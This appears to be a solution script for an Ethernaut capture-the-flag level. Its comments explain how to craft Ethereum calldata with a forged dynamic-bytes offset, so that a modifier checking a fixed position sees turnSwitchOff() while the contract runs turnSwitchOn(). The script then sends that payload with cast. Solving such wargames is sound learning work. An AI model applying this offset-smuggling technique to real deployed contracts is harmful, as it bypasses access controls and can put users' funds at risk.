source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# crude calldata is in the format:
# | 4 bytes function selector | n parameter bytes |
# for example if parameter is a uint256, the n parameter bytes are just 32 bytes for the parameter value
# but in this case the parameter is "bytes", so custom data length. for this the EVM has a special format:
# 32 bytes parameter location offset | 32 bytes parameter size | n bytes parameter data
# so the crude calldata format is:
# | 4 bytes function selector | 32 bytes parameter location offset | 32 bytes parameter size | n bytes parameter data

# with this we can build a calldata that satisfies the CTF requirements:
# the modifier reads hardcoded from the position 68, and wants the selector to be == turnOff()
# but the contract can interpret the parameter in a different position, so we can build
# \ 4 bytes function selector: cast sig "flipSwitch(bytes)" -> 0x 30c13ade
# \ 32 bytes parameter location offset -> 0x00..00 (for now, we will calculate this later)
# \ 32 bytes "size" -> we can put anything, 0x00 or 0x04.
# \ 32 bytes "parameter data" -> here the modifier reads to compare. so we put what the modifier wants: # cast sig "turnSwitchOff()" -> 0x 20606e15
# \ 32 bytes size -> now we write our actual parameter size: 0x00..04
# \ 32 bytes parameter data -> our actual parameter content: # cast sig "turnSwitchOn()" -> 0x 76227e12
# this way, in "offset" we can point to our "actual" parameter, not the fake one put to trick the modifier
# we count 96 positions (jumping over the fake parameter values). so in the offset we put:
# \ 32 bytes parameter location offset -> 0x00..60 (this now points to our actual parameter size and content)
# with this we build the raw calldata: 0x30c13ade 0000000000000000000000000000000000000000000000000000000000000060 0000000000000000000000000000000000000000000000000000000000000000 20606e1500000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000004 76227e1200000000000000000000000000000000000000000000000000000000
# and we send it:

cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0xC37B6E64876eCf6663BBe88c3D494838726CefF1 \
    0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

echo "final switch state:"
cast call \
    --rpc-url $RPC_URL \
    0xC37B6E64876eCf6663BBe88c3D494838726CefF1 \
    "switchOn()(bool)"

